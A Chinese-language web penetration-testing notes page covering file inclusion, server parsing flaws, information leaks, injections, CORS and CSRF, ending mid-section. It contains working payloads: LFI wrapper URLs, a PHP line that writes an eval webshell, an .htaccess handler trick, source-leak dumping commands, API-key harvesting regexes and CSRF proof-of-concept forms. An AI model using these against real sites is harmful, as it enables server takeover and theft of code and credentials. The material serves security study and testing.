# Web Generic

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

# 大纲

* **[文件包含](#文件包含)**
    * [日志中毒攻击](#日志中毒攻击)

* **[文件解析](#文件解析)**
    * [IIS](#iis)
    * [Nginx](#nginx)
    * [Apache](#apache)
    * [其他](#其他)

* **[文件上传](#文件上传)**

* **[信息泄露](#信息泄露)**
    * [目录遍历](#目录遍历)
    * [任意文件读取](#任意文件读取)
    * [源码泄露](#源码泄露)
        * [GIT](#git)
        * [SVN](#svn)
        * [bzr](#bzr)
    * [DS_Store文件泄漏](#ds_store文件泄漏)
    * [SWP文件泄露](#swp文件泄露)
    * [网站备份压缩文件](#网站备份压缩文件)
    * [WEB-INF/web.xml信息泄露](#web-infwebxml信息泄露)
    * [idea文件夹泄露](#idea文件夹泄露)
    * [JS敏感信息泄露](#js敏感信息泄露)
    * [Swagger_REST_API信息泄露](#Swagger_REST_API信息泄露)
    * [各类APIkey泄露](#各类apikey泄露)
    * [SOAP泄露](#SOAP泄露)

* **[不安全的输入](#不安全的输入)**
    * [http参数污染](#http参数污染)
    * [CRLF_Injection](#crlf_injection)
    * [host_Injection](#host_Injection)
    * [SQL_inje](#sql_inje)
    * [XSS](#xss)
    * [XXE](#xxe)
    * [SSRF](#ssrf)
    * [SSTI](#ssti)

* **[配置不当](#配置不当)**
    * [代理配置不当](#代理配置不当)
    * [CORS](#cors)
    * [CSRF](#csrf)
    * [jsonp劫持](#jsonp劫持)

* **[钓鱼欺骗](#钓鱼欺骗)**
    * [URL跳转漏洞](#url跳转漏洞)
    * [二维码劫持](#二维码劫持)
    * [点击劫持](#点击劫持)

---

**相关文章**
- [聊聊安全测试中如何快速搞定 Webshell](https://www.freebuf.com/articles/web/201421.html)
- [Web Service 渗透测试从入门到精通](https://www.anquanke.com/post/id/85910)
- [我的Web应用安全模糊测试之路](https://web.archive.org/web/20180814113607/https://gh0st.cn/archives/2018-07-25/1)
- [聊聊近期公开的几个GitLab高额奖金漏洞](https://mp.weixin.qq.com/s/m8AZuqXgGGitcwsP4l-sVQ)

---

# 文件包含

文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在 PHP 中，提供了：`include()`,`include_once()`,`require()`,`require_once()` 这些文件包含函数，这些函数在代码设计中被经常使用到。

大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：
1. 本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
2. 远程文件包含漏洞：能够通过 url 地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩

因此，在 web 应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。

**相关文章**
- [LFI、RFI、PHP 封装协议安全问题学习 - 骑着蜗牛逛世界](https://www.cnblogs.com/LittleHann/p/3665062.html#3831621)
- [php 文件包含漏洞 | Chybeta](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)
- [文件包含漏洞](https://blog.csdn.net/le0nis/article/details/52043732)
- [文件包含漏洞(绕过姿势)](https://xz.aliyun.com/t/1189)
- [文件包含漏洞原理分析](https://zhuanlan.zhihu.com/p/25069779)
- [文件包含漏洞总结 | 瓦都剋](http://byd.dropsec.xyz/2016/07/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)
- [本地文件包含漏洞利用技巧](https://www.secpulse.com/archives/55769.html)
- [Directory Traversal, File Inclusion, and The Proc File System](https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/)
- [Exploiting PHP File Inclusion - Overview | Reiners' Weblog](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)
- [Local File Inclusion with Magic_quotes_gpc enabled - NotSoSecure](https://notsosecure.com/local-file-inclusion-magicquotesgpc-enabled)
- [Positive Technologies - learn and secure : Another alternative for NULL byte](https://web.archive.org/web/20210514190401/https://blog.ptsecurity.com/2010/08/another-alternative-for-null-byte.html)
- [远程包含和本地包含漏洞的原理 - Kevins 的天空](https://blog.csdn.net/iiprogram/article/details/2349322)
- [聊聊安全测试中如何快速搞定Webshell](https://www.freebuf.com/articles/web/201421.html)

**相关案例**
- [IKEA官网本地文件包含(LFI)漏洞分析](https://blog.51cto.com/u_15127538/2714257)

**几种利用方法**
- 常规利用

    `Payload: http://www.test.com/test.php?file=upload/hourse.jpg&x=phpinfo()`

- 文件协议读取

    其前提是得知道网站应用的绝对路径(物理路径):

    `Payload: http://www.test.com/test.php?file=file://D:/Server/htdocs/test/upload/hourse.jpg&x=phpinfo()`

    结果和上面一样,只是地址栏链接不一样.

- 压缩包文件读取

    依然需要知道压缩包文件的绝对路径

    `Payload: http://www.test.com/test.php?file=zip://D:/Server/htdocs/test/upload/shell.zip%23shell.php&x=phpinfo())`

- phar:// 相对路径运行 PHP 文件

    当我们想要运行自己的 PHP 文件,该咋做呐？通过文件包含(include,require 这类函数),首先构造一个这样的文件,将 webshell.php 添加到压缩文件 .zip,然后将压缩包后缀名改为 .jpg 反正合法的文件后缀即可(一般的操作是这样的,当只能上传图片的时候),最后使用 phar:// 按照相对路径读取并执行文件.

    `Payload:http://www.test.php?file=phar://upload/shell.jpg/shell.php?x=phpinfo()`

- 读取源码

    当我们没法儿上传文件,但是又想读取文件的源码来寻找别的漏洞从而进一步利用该怎么做呐？同样的利用 php://filter/ 协议可以实现,要注意的是,因为编码问题,一般我们会将读取的文件先 Base64 编码一下输出:

    `Payload:http://www.test.com/test.php?file=php://filter/read=convert.base64-encode/resource=upload/shell.php`

## 日志中毒攻击

`log poisoning`

**相关文章**
- [RCE with LFI and SSH Log Poisoning](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)
- [Apache Log Poisoning through LFI](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)
- [From Local File Inclusion to Remote Code Execution - Part 1 | Outpost 24 blog](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)
- [SMTP Log Poisioning through LFI to Remote Code Execution](https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/)

---

# 文件解析

**相关文章**
- [解析漏洞总结 - erevus](http://www.vuln.cn/7070)

## IIS

**5.x/6.0 解析漏洞**

IIS 6.0 解析利用方法有两种

1. 目录解析

    `/xx.asp/xx.jpg`

2. 文件解析

    `wooyun.asp;.jpg `

第一种,在网站下建立文件夹的名字为 .asp、.asa 的文件夹,其目录内的任何扩展名的文件都被 IIS 当作 asp 文件来解析并执行.

例如创建目录 wooyun.asp,那么 `/wooyun.asp/1.jpg` 将被当作 asp 文件来执行.假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿 shell 了.

第二种,在 IIS6.0 下,分号后面的不被解析,也就是说 `wooyun.asp;.jpg` 会被服务器看成是wooyun.asp

还有 IIS6.0 默认的可执行文件除了 asp 还包含这三种
```
/wooyun.asa
/wooyun.cer
/wooyun.cdx
```

- **相关案例**
    - [网站安全狗IIS6.0解析webshell访问限制bypass](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0128432)
    - [网站安全狗免杀神技+IIS6.0解析WebShell访问限制Bypass](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0104444)
    - [网站安全狗IIS6.0解析webshell访问拦截bypass](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-071861)
    - [桃源网络硬盘&IIS6.0解析漏洞](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2011-02632)

---

## Nginx

**IIS 7.0/IIS 7.5/Nginx <8.03 畸形解析漏洞**

在默认 Fast-CGI 开启状况下,黑阔上传一个名字为 wooyun.jpg,内容为

`<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>`

然后访问 wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php

- **相关案例**
    - [用友软件某分站SQL注入漏洞+nginx解析漏洞](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-032250)
    - [新浪网分站多处安全漏洞(nginx解析+SQL注射等)小礼包 ](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-021064)
    - [kingsoft.com某x级域名nginx解析漏洞+爆路径 ](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-019253)

**Nginx <8.03 空字节代码执行漏洞**

影响版:0.5.,0.6., 0.7 <= 0.7.65, 0.8 <= 0.8.37

Nginx 在图片中嵌入 PHP 代码然后通过访问 `xxx.jpg%00.php` 来执行其中的代码

---

## Apache

Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.

比如 wooyun.php.owf.rar ".owf"和".rar" 这两种后缀是 apache 不可识别解析,apache 就会把 wooyun.php.owf.rar 解析成 php.

如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个 wooyun.php.rar.jpg.png…(把你知道的常见后缀都写上…)去测试是否是合法后缀

- **相关案例**
    - [安卓开发平台存在上传漏洞和 Apache 解析漏洞,成功获取 webshell](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-018433)

**.htaccess**

如果在 Apache 中 .htaccess 可被执行.且可被上传.那可以尝试在 .htaccess 中写入: `<FilesMatch "wooyun.jpg"> SetHandler application/x-httpd-php </FilesMatch>` 然后再上传 shell.jpg 的木马, 这样 shell.jpg 就可解析为 php 文件.

**CVE-2017-15715 Apache HTTPD 换行解析漏洞**

其 2.4.0~2.4.29 版本中存在一个解析漏洞,在解析 PHP 时,1.php\x0A 将被按照 PHP 后缀进行解析,导致绕过一些服务器的安全策略.

原理:在解析 PHP 时,1.php\x0A 将被按照 PHP 后缀进行解析.

用 hex 功能在 1.php 后面添加一个 \x0A

![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/1.png)

访问 http://10.10.10.131:8080/1.php%0A ,成功解析

---

## 其他

在 windows 环境下,`xx.jpg[空格]` 或 `xx.jpg.` 这两类文件都是不允许存在的,若这样命名,windows 会默认除去空格或点,黑客可以通过抓包,在文件名后加一个空格或者点绕过黑名单.若上传成功,空格和点都会被 windows 自动消除,这样也可以 getshell.

**CGI 解析漏洞**

`/.php`

---

# 文件上传

- [Upload](./Upload.md)

---

# 信息泄露

**相关文章**
- [谈谈源码泄露](https://blog.csdn.net/GitChat/article/details/79014538)
- [敏感文件泄露](https://www.xazlsec.com/index.php/archives/62/)

**相关工具**
- [lijiejie/BBScan](https://github.com/lijiejie/BBScan) - 用于渗透测试前期，快速地对大量目标进行扫描，发现信息泄露等常见漏洞，找到可能的突破入口。
- [jerrychan807/WSPIH](https://github.com/jerrychan807/WSPIH) - 网站个人敏感信息文件扫描器
- [ring04h/weakfilescan](https://github.com/ring04h/weakfilescan) - 动态多线程敏感信息泄露检测工具
- [0xHJK/dumpall](https://github.com/0xHJK/dumpall) - 一款信息泄漏利用工具，适用于 .git/.svn 源代码泄漏和 .DS_Store 泄漏
    ```bash
    # pip安装
    pip install dumpall
    # 查看版本
    dumpall --version
    # 示例
    dumpall -u http://example.com/.git/
    dumpall -u http://example.com/.svn/
    dumpall -u http://example.com/.DS_Store
    dumpall -u http://example.com/
    ```
- [donot-wong/sensinfor](https://github.com/donot-wong/sensinfor) - 一个自动扫描敏感文件的chrome扩展.

---

## 目录浏览

**Tips**

使用 wget 遍历下载所有文件
```
wget -r --no-pare target.com/dir
```

## 目录遍历

**相关案例**
- [京东商城两处任意目录遍历下载漏洞](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0214222)
- [2 Path Traversal Cases](https://jlajara.gitlab.io/web/2020/03/29/Path_Traversal.html)
- [电信某分站配置不当导致敏感文件泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-095088)

## 任意文件读取

**相关案例**
- [一个任意文件读取漏洞记录](https://toutiao.io/posts/423535/app_preview)
- [南方周末邮件服务器任意文件读取漏洞](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-045426)

---

## 源码泄露

### GIT

**简介**

当在一个空目录执行 git init 时,Git 会创建一个 `.git` 目录. 这个目录包含所有的 Git 存储和操作的对象. 如果想备份或复制一个版本库,只需把这个目录拷贝至另一处就可以了.

- `/.git/config`

**相关案例**

- [大众点评某站点 git 泄漏源代码](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0117332)

**相关工具**

- [lijiejie/GitHack](https://github.com/lijiejie/GitHack) - 一个 `.git` 泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。
    ```bash
    python2 GitHack.py http://www.openssl.org/.git/
    ```
- [gakki429/Git_Extract](https://github.com/gakki429/Git_Extract) - 提取远程 git 泄露或本地 git 的工具
    ```bash
    python2 git_extract.py http://example.com/.git/  # 一个存在 .git 泄露的网站
    python2 git_extract.py example/.git/             # 一个本地的 .git 路径
    ```

---

### SVN

- `/.svn/entries`

**相关案例**
- [我爱我家某处源码泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0149331)

**相关工具**
- [kost/dvcs-ripper](https://github.com/kost/dvcs-ripper) - SVN/GIT/HG 等版本控制系统的扫描工具
- [admintony/svnExploit](https://github.com/admintony/svnExploit) - 一款 SVN 源代码利用工具，其完美支持 SVN<1.7 版本和 SVN>1.7 版本的 SVN 源代码泄露

---

### bzr

**相关工具**
- [kost/dvcs-ripper](https://github.com/kost/dvcs-ripper) - SVN/GIT/HG 等版本控制系统的扫描工具
    ```
    rip-bzr.pl -v -u http://www.example.com/.bzr/
    ```

---

## DS_Store文件泄漏

**简介**

`.DS_Store` 文件 MAC 系统是用来存储这个文件夹的显示属性的:比如文件图标的摆放位置.如果用户删除以后的副作用就是这些信息的失去.

这些文件本来是给 Finder 使用的,但它们被设想作为一种更通用的有关显示设置的元数据存储,诸如图标位置和视图设置. 当你需要把代码上传的时候,安全正确的操作应该把 `.DS_Store` 文件删除才正确.

因为里面包含了一些目录信息,如果没有删除,攻击者通过 `.DS_Store` 可以知道这个目录里面所有文件名称,从而让攻击者掌握了更多的信息.　

**相关案例**
- [TCL 某网站 DS_Store 文件泄露敏感信息](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-091869)

**相关工具**
- [lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp) - 一个 `.DS_Store` 文件泄漏利用脚本，它解析 `.DS_Store` 文件并递归地下载文件到本地。
- [anantshri/DS_Store_crawler_parser](https://github.com/anantshri/DS_Store_crawler_parser) - `.DS_Store` 文件解析脚本,递归地获取文件夹内的 `.ds_Store`
- [gehaxelt/Python-dsstore](https://github.com/gehaxelt/Python-dsstore)

---

## SWP文件泄露

**简介**

swp 即 swap 文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。

直接访问 .swp 文件，下载回来后删掉末尾的 .swp，获得源码文件

---

## gedit备份文件

**简介**

linux 下，gedit 保存后当前目录会生成后缀为 “~” 的文件，然后通过浏览器访问这个文件就能得到原始文件的内容。

---

## 网站备份压缩文件

**简介**

该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下.

该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载,利用源代码中所包含的各类敏感信息,如服务器数据库连接信息,服务器配置信息等会因此而泄露,造成巨大的损失.

**相关案例**
- [百度某分站备份文件泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-050622)
- [乐友商城 24GB 代码与数据库敏感文件泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0124051)

**相关工具**
- [oscommonjs/scan-backup-langzi-](https://github.com/oscommonjs/scan-backup-langzi-) - 扫描备份文件和敏感信息泄漏的扫描器，速度快，器大活好

**Tips**
- 有时候文件太大,想先确认一下文件结构和部分内容,这时可以使用 remotezip,直接列出远程 zip 文件的内容，而无需完全下载,甚至可以远程解压,仅下载部分内容
    ```BASH
    pip3 install remotezip
    remotezip -l "http://site/bigfile.zip"          # 列出远程zip文件的内容
    remotezip "http://site/bigfile.zip" "file.txt"  # 从远程zip⽂件解压出file.txt
    ```

---

## WEB-INF/web.xml信息泄露

**简介**

WEB-INF 是 Java 的 WEB 应用的安全目录.该目录原则上来说是客户端无法访问,只有服务端才可以可以访问.如果想在页面中直接访问其中的文件,必须通过 `web.xml` 文件对要访问的文件进行相应映射才能访问.

WEB-INF 主要包含一下文件或目录:
```
/WEB-INF/web.xml:Web 应用程序配置文件,描述了 servlet 和其他的应用组件配置及命名规则;
/WEB-INF/classes/:含了站点所有用的 class 文件,包括 servlet class 和非 servlet class,他们不能包含在 .jar 文件中;
/WEB-INF/lib/:存放 web 应用需要的各种 JAR 文件,放置仅在这个应用中要求使用的 jar 文件 , 如数据库驱动 jar 文件;
/WEB-INF/src/:源码目录,按照包名结构放置各个 java 文件;
/WEB-INF/database.properties:数据库配置文件.
```
不过在一些特定的场合却会让攻击者能读取到其中的内容,从而造成源码泄露.

**相关案例**
- [华为官网 WEB-INF 目录配置文件导致信息泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-022906)

---

## idea文件夹泄露

**相关工具**
- [lijiejie/idea_exploit](https://github.com/lijiejie/idea_exploit) - 一个 `.idea` 文件泄漏利用脚本

---

## JS敏感信息泄露

**相关文章**
- [JS 敏感信息泄露:不容忽视的 WEB 漏洞](https://www.secpulse.com/archives/35877.html)

**相关案例**
- [从JS信息泄露到Webshell](http://r3start.net/index.php/2019/07/15/546)
- [一次有意思的js未授权访问](https://mp.weixin.qq.com/s/E9PqzhNHYOC8pRJ7FQonfg)

**相关工具**
- [m4ll0k/SecretFinder](https://github.com/m4ll0k/SecretFinder) - 通过正则在 JS 中发现敏感数据，如 apikeys、accesstoken、authorizations、jwt，..等等
    ```bash
    python3 SecretFinder.py -i https://example.com/ -e
    ```

    建议自行添加如下规则
    ```re
    'access_key': r'[Aa](ccess|CCESS)_?[Kk](ey|EY)|[Aa](ccess|CCESS)_?[sS](ecret|ECRET)|[Aa](ccess|CCESS)_?(id|ID|Id)',
    'secret_key': r'[Ss](ecret|ECRET)_?[Kk](ey|EY)',
    'JWT': r'[= ]ey[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*',
    'ALL_JWT': r'[= ]ey[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*',
    ```

- [Threezh1/JSFinder](https://github.com/Threezh1/JSFinder) - 通过在 js 文件中提取 URL,子域名
    ```bash
    python JSFinder.py -u http://www.xxx.com -d -ou url.txt -os subdomain.txt
    python JSFinder.py -u http://www.xxx.com -d -c "session=xxx"    # -c 指定cookie来爬取页面
    ```

---

## Swagger_REST_API信息泄露

**相关文章**
- [关于Swagger-UI下的渗透实战](https://blog.m1kh.com/index.php/archives/403/)
- [接口文档下的渗透测试](https://mp.weixin.qq.com/s/xQUnTXo38x_jLWv5beOQ0Q)

**相关工具**
- [lijiejie/swagger-exp](https://github.com/lijiejie/swagger-exp)
- [jayus0821/swagger-hack](https://github.com/jayus0821/swagger-hack) - 自动化爬取并自动测试所有 swagger 接口

---

## 各类APIkey泄露

**相关文章**
- [Unauthorized Google Maps API Key Usage Cases, and Why You Need to Care](https://medium.com/@ozguralp/unauthorized-google-maps-api-key-usage-cases-and-why-you-need-to-care-1ccb28bf21e)
- [一些提取api key的正则表达式](https://bacde.me/post/Extract-API-Keys-From-Regex/)
- [企业微信Secret Token利用思路](https://mp.weixin.qq.com/s/LMZVcZk7_1r_kOKRau5tAg)

**相关案例**
- [WooYun-2015-141929 - 神器之奇虎360某命令执行导致网站卫士等多个重要业务官网可getshell（可能影响接入站长）](https://php.mengsec.com/bugs/wooyun-2015-0141929.html)
- [Flickr Account Takeover using AWS Cognito API](https://hackerone.com/reports/1342088)
    - [Flickr Account Takeover](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/)

---

以下正则来自 <sup>[[一些提取api key的正则表达式](https://bacde.me/post/Extract-API-Keys-From-Regex/)]</sup>
```re
'aliyun_oss_url': '[\\w-.]\\.oss.aliyuncs.com',
'azure_storage': 'https?://[\\w-\.]\\.file.core.windows.net',
'access_key': '[Aa](ccess|CCESS)_?[Kk](ey|EY)|[Aa](ccess|CCESS)_?[sS](ecret|ECRET)|[Aa](ccess|CCESS)_?(id|ID|Id)',
'secret_key': '[Ss](ecret|ECRET)_?[Kk](ey|EY)',
'slack_token': '(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})',
'slack_webhook': 'https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}',
'facebook_oauth': '[f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].{0,30}['\'\\s][0-9a-f]{32}['\'\\s]',
'twitter_oauth': '[t|T][w|W][i|I][t|T][t|T][e|E][r|R].{0,30}['\'\\s][0-9a-zA-Z]{35,44}['\'\\s]',
'heroku_api': '[h|H][e|E][r|R][o|O][k|K][u|U].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}',
'mailgun_api': 'key-[0-9a-zA-Z]{32}',
'mailchamp_api': '[0-9a-f]{32}-us[0-9]{1,2}',
'picatic_api': 'sk_live_[0-9a-z]{32}',
'google_api': 'AIza[0-9A-Za-z-_]{35}',
'google_captcha': '6L[0-9A-Za-z-_]{38}',
'google_oauth': 'ya29\\.[0-9A-Za-z\\-_]+',
'amazon_aws_access_key_id': 'AKIA[0-9A-Z]{16}',
'amazon_mws_auth_token': 'amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
'amazonaws_url': 's3\\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\\.s3\\.amazonaws.com',
'facebook_access_token': 'EAACEdEose0cBA[0-9A-Za-z]+',
'mailgun_api_key': 'key-[0-9a-zA-Z]{32}',
'twilio_api_key': 'SK[0-9a-fA-F]{32}',
'twilio_account_sid': 'AC[a-zA-Z0-9_\\-]{32}',
'twilio_app_sid': 'AP[a-zA-Z0-9_\\-]{32}',
'paypal_braintree_access_token': 'access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}',
'square_oauth_secret': 'sq0csp-[ 0-9A-Za-z\\-_]{43}',
'square_access_token': 'sqOatp-[0-9A-Za-z\\-_]{22}',
'stripe_standard_api': 'sk_live_[0-9a-zA-Z]{24}',
'stripe_restricted_api': 'rk_live_[0-9a-zA-Z]{24}',
'github_access_token': '[a-zA-Z0-9_-]*:[a-zA-Z0-9_\\-]+@github\\.com*',
'rsa_private_key' : '-----BEGIN RSA PRIVATE KEY-----',
'ssh_dsa_private_key' : '-----BEGIN DSA PRIVATE KEY-----',
'ssh_dc_private_key' : '-----BEGIN EC PRIVATE KEY-----',
'pgp_private_block' : '-----BEGIN PGP PRIVATE KEY BLOCK-----',
'json_web_token' : 'ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*$',
'JWT':'[= ]ey[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*',
'ALL_JWT':'[= ]ey[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*',
```

**正则资源**
- https://github.com/databricks/security-bucket-brigade/blob/3f25fe0908a3969b325542906bae5290beca6d2f/Tools/s3-secrets-scanner/rules.json

## SOAP泄露

**相关文章**
- [【技术分享】针对SOAP的渗透测试与防护](https://www.anquanke.com/post/id/85410)
- [Web Service渗透测试](https://www.mi1k7ea.com/2021/01/16/Web-Service%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/)

**相关工具**
- [SmartBear/soapui](https://github.com/SmartBear/soapui#build-and-run)
- [NetSPI/Wsdler](https://github.com/NetSPI/Wsdler) - 用于帮助测试 wsdl 接口的 burp 插件
- [ReadyAPI](https://smartbear.com/product/ready-api/api-functional-testing/free-trial/)

---

# 不安全的输入

## RCE

- [RCE 笔记](./RCE.md)

## HTTP参数污染

**相关文章**
- [Web 应用里的 HTTP 参数污染 (HPP) 漏洞](https://blog.csdn.net/eatmilkboy/article/details/6761407)
- [浅谈绕过 waf 的数种方法](https://blog.51cto.com/fcinbj/734197)
- [通过 HTTP 参数污染绕过 WAF 拦截](https://www.cnblogs.com/ssooking/articles/6337366.html)

**相关案例**
- [通过 HTTP 参数污染绕过 reCAPTCHA 认证](https://www.anquanke.com/post/id/146570)

---

## CRLF_Injection

**相关案例**
- [新浪某站CRLF Injection导致的安全问题](https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html)

## HOST_Injection

**相关文章**
- [检测到目标url存在框架注入漏洞_HOST注入攻击剖析](https://blog.csdn.net/weixin_39609500/article/details/111349436)
- [超详细http host注入攻击原理详解及漏洞利用](https://blog.csdn.net/madao1o_o/article/details/107507344)
- [安服仔小工具-Host注入](https://mp.weixin.qq.com/s/l8deOajHO2-yoSMcAScktA)

---

## SQL_inje

- [SQLi 笔记](./SQLi.md)

---

## XSS

- [XSS 笔记](./XSS.md)

---

## XXE

- [XXE 笔记](./XXE.md)

---

## SSI

`Server Side Includes 服务器端包含`

**简介**

SSI 就是在 HTML 文件中，可以通过注释行调用的命令或指针，即允许通过在 HTML 页面注入脚本或远程执行任意代码。

**相关文章**
- [服务器端包含注入SSI分析总结](https://www.secpulse.com/archives/66934.html)

---

## SSRF

- [SSRF 笔记](./SSRF.md)

---

## SSTI

`服务器端模板注入`

- [SSTI 笔记](./SSTI.md)

---

## 表达式注入

**相关文章**
- [表达式注入](https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/)

---

## WebSocket安全

**相关文章**
- [利用WebSocket接口中转注入渗透实战](https://www.freebuf.com/articles/web/281451.html) - 通过脚本中转 websocket 让 sqlmap 可以注入

---

# 配置不当

## 代理配置不当

**相关案例**
- [新浪HTTP代理配置不当漫游内网](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0131169)
- [陌陌一处代理配置不当，已验证可绕过IP过滤探测敏感资源](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-083202)
- [陌陌web服务器Path处理不当可以正向代理(idc机器/打不到办公网)](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0191121)
- [挖洞经验之代理不当日进内网](https://mp.weixin.qq.com/s/EtUmfMxxJjYNl7nIOKkRmA)
- [价值1万美金的谷歌内部主机信息泄露漏洞](https://mp.weixin.qq.com/s/hYZr6EjwE99uTQpzoJRp0g)
- [Cloud Penetration Testing the Capital One Breach](https://cloudsecurityalliance.org/blog/2019/10/10/cloud-penetration-testing-the-capital-one-breach/)

---

## CORS

**简介**

CORS 跨域漏洞的本质是服务器配置不当，即 Access-Control-Allow-Origin 设置为 * 或是直接取自请求头 Origin 字段，Access-Control-Allow-Credentials 设置为 true。

**CORS 与 CSRF 的区别**

CORS 机制的目的是为了解决脚本的跨域资源请求问题，不是为了防止 CSRF。

CSRF 一般使用 form 表单提交请求，而浏览器是不会对 form 表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。

脚本的跨域请求在同源策略的限制下，响应会被拦截，即阻止获取响应，但是请求还是发送到了后端服务器。
- 相同点：都需要第三方网站；都需要借助 Ajax 的异步加载过程；一般都需要用户登录目标站点。
- 不同点：一般 CORS 漏洞用于读取受害者的敏感信息，获取请求响应的内容；而 CSRF 则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。

**相关文章**
- [JSONP与CORS漏洞挖掘](https://www.anquanke.com/post/id/97671)
- [认识CORS漏洞](https://mp.weixin.qq.com/s/GZRsg6pEaUlIq_eyMd3fBA)
- [浅析CORS攻击及其挖洞思路](https://xz.aliyun.com/t/7242)
- [CORS跨域漏洞学习](https://www.cnblogs.com/Xy--1/p/13069099.html)

**相关案例**
- [CORS Misconfiguration, could lead to disclosure of sensitive information](https://hackerone.com/reports/426165)
- [看我如何绕过Yahoo！View的CORS限制策略](https://www.freebuf.com/articles/web/158529.html)

**相关工具**
- [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - 一个旨在发现网站的 CORS 错误配置漏洞的 python 工具
- [Santandersecurityresearch/corsair_scan](https://github.com/Santandersecurityresearch/corsair_scan)

**相关靶场**
- [incredibleindishell/CORS_vulnerable_Lab-Without_Database](https://github.com/incredibleindishell/CORS_vulnerable_Lab-Without_Database)

---

## CSRF

**简介**

跨站请求伪造（CSRF/XSRF）攻击，攻击者通过钓鱼或其他手段欺骗用户在他们目前已认证的网络应用程序上执行不需要的行动。

**验证方法**

- GET
    ```html
    <a href="http://www.example.com/api/setusername?username=uname">Click Me</a>
    ```

- POST
    ```html
    <form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
    <input name="username" type="hidden" value="uname" />
    <input type="submit" value="Submit Request" />
    </form>
    ```

- JSON GET
    ```html
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://www.example.com/api/currentuser");
    xhr.send();
    </script>
    ```

- JSON POST
